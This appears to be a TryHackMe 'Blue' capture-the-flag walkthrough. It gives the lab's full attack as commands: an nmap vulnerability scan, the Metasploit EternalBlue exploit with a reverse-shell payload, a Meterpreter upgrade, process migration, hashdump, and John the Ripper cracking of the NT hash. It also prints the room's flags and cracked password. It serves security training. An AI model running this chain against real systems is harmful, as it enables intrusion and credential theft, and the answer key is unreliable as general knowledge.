@@ -1,0 +1,218 @@
+# 10.21.20
+# TryHackMe blue
+# tryhackme.com/room/blue
+# srsploit walkthrough
+
+      Task 1
+
+- mkdir /tryhackme/blue
+- cd /tryhackme/blue
+- set IP=10.10.235.204 (switch this out for your room's)
+# Creates variable IP and sets it to your room's
+# To use this IP instead of typing it out every time, use $IP
+- Enumerate the machine
+
+nmap -T5 -sC -sV --script vuln $IP
+# -T5 sets the maximum speed
+# -sC sets
+# -sV sets
+# --script vuln runs a vulnerability scan
+# $IP is the room IP
+
+- After the scan is finished, you'll have a lot of information to
+  look through.
+- Note the number of ports open (3)
+  We may be able to use these ports later on
+- Look for the final header "Host script results:"
+  This will show you the potential vulnerable services. In this case,
+  you can see that 3 of the 4 services are false or denied, leaving
+  one service vulnerable to a remote code execution attack.
+
+Flag answers:
+Ports open: 3
+Vulnerable to: smb-vuln-ms17-010
+
+      Task 2
+
+- Now that we know this machine's vulnerability, we're going to want
+  to set up the attack. Load up *msfconsole*
+- Once *msfconsole* is running, type out the path to the exploit. I used
+  searchsploit ms17-010 to find a list, and then msfconsole to double
+  check myself. This isn't necessary, you can just initialize msfconsole
+  and type:
+
+search ms17-010
+
+  This will generate a list and paths of exploits and their ranked
+  effectiveness. In this case, we'll be using ms17_010_eternalblue
+
+- In msfconsole you'll see the prompt "Interact with a module..."
+  Since we're going for the exploit marked "3", type "use 3"
+  >>> Double check that it's the same exploit, it may return in a
+  different order from my search. We're looking for the exploit
+  marked "ms17_010_eternalblue"
+- This will load the exploit. Type "show options" and see what
+  input is needed from us.
+- RHOSTS needs to be added, this will be the target's IP.
+  You will also see LHOST and LPORT near the bottom of the screen.
+  Your IP will be automatically listed next to LHOST. If it's not
+  your tun0 (openvpn) IP, you should change that.
+
+- Back on your Metasploit tab, make sure to set rhosts to the victim's IP
+  I like to type out the IP as a double-check for myself
+  Also double check that the lhost is your openvpn's IP 
+  (tun0 result after ifconfig)
+
+set rhosts 10.10.235.204
+set lhost (Your system IP)
+
+- Now that that's all set, you'll type "run" into the msfconsole
+
+> run
+
+- This process will take a while. Let it run until Metasploit pops back
+  with something, be that failure or success.
+  - When I first ran it, I encountered a failure/Metasploit exit
+    on the first attempt. To fix it, in msfconsole:
+> set payload generic/shell_reverse_tcp
+    Then run again.
+- When you reach a success, you'll see a Windows command line prompt
+  in the Metasploit console. If "WIN!" appears, but not the command
+  line, press enter.
+
+      Task 3
+
+- Next you'll want to background this shell CTRL+Z
+- We need to take this shell and upgrade it to *meterpreter*
+
+  In order to do this, you'll type in the msfconsole:
+
+> use post/multi/manage/shell_to_meterpreter
+> show options
+
+  You'll see that the SESSION doesn't have a setting. We'll need to set it
+  to "1"
+
+> set session 1
+> run
+
+  It will take a few seconds, but it will convert the shell into what
+  we need.
+
+- Type "sessions" to confirm that you are in fact running meterpreter
+
+  Then type
+
+> sessions -i 2
+
+  You'll see "msf5" be replaced with "meterpreter >"
+  To confirm that we're running as admin, type
+
+shell
+
+  Windows command line will pop up, type
+
+whoami
+
+  nt authority\system
+
+  Hit CTRL+Z to background that shell. You'll be back in meterpreter.
+  
+- Next, we'll be migrating to a more stable process. Type "ps"
+  You'll see a list of services and their ID numbers.
+  The key to this is finding a service that will likely be stable.
+  spoolsv.exe is a common service that's stable.
+  It's a printer service, so it's got Authority permissions.
+  In my system, spoolsv.exe is marked as 1304 in the far left column.
+  It may vary on yours. Find the number for spoolsv.exe and make note of it
+  
+- Focusing back on the command line, type
+
+migrate 1304
+
+  You'll likely see "Migration completed successfully."
+  If not, you can pick a different NT AUTHORITY labeled service and try
+  to migrate to that. The important thing to note:
+  You can migrate from "authority" to "authority" without losing privileges,
+  but if you move from "authority" to a lower tier, you can't migrate
+  back up.
+
+
+Flags:
+1 - post/multi/manage/shell_to_meterpreter
+2 - SESSION
+
+        Task 4 - Onto password cracking
+
+- Now that you've migrated, you can go ahead and type "getuid" and
+  verify that you're still system authority.
+- Next we're going to do a hashdump and check out what users we've got
+  on this machine
+
+hashdump
+
+- You'll see an admin, guest and Jon labeled with their password hashes
+- Go ahead and copy the whole line of the hash, including "Jon"
+  I used another terminal window and made a file in my tryhackme/blue
+  folder.
+  You can do this in a variety of ways, I used gedit pass.hash and saved
+  the file. You could also use (including the quotation marks)
+
+echo "paste_text_here" > pass.hash
+
+- We'll use John the Ripper to crack this password. The binary is
+  "john", and you'll need to either be root or use sudo to run it.
+  We will also need to find our wordlist. We'll be using rockyou.txt,
+  which will be loaded on your Kali system if that's the OS you're using.
+  rockyou.txt is available lots of places online if you're using a
+  different OS. I've found it on github.
+  If you don't know where it's located on your system, you can type
+
+updatedb
+locate rockyou.txt
+
+  Mine is in /usr/share/wordlists/ and was compressed, so you may
+  need to decompress the file first.
+
+  Onto running john:
+
+sudo john pass.hash format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+
+  The binary will run and we'll get a "Session completed" line.
+  To show the cracked password, type
+
+sudo john pass.hash --format=NT --show
+
+  It will display the password between Jon and the start of the hash
+
+Flags:
+1 - Jon
+2 - alqfna22
+
+        Task 5
+
+- Next we're just collecting the flags that we need.
+  Go back to the meterpreter console and pwd to check out which
+  directory we're working out of. You can see that we're in system32
+  and our hint suggests we navigate to the C: directory.
+
+cd ..
+cd ..
+ls
+
+  As you can see, flag1.txt is listed. Type cat flag1.txt
+  You'll enter in the contents between {}
+
+access_the_machine
+
+- The next flag's hint is that it's stored on Windows. Windows
+  stores its passwords in the system32 folder, so we'll navigate
+  back to system32 and cat flag2.txt
+
+sam_database_elevated_access
+
+- The final flag is found in Jon's Documents folder
+Path: C:\Users\Jon\Documents
+  ls in this directory and cat flag3
+
+      Congrats! You're done.
